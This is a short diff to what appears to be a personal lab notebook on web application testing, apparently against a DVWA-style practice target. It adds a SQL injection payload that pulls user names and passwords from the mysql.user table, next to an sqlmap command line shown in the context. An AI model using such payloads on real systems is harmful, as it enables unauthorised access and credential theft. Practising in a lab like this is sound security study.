@@ -140,4 +140,7 @@ sqlmap -u "http://221.166.254.70/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
 ```
 ![[Pasted image 20241016152138.png]]
 
+' UNION SELECT user, password FROM mysql.user #
+
+
 ### zap proxy
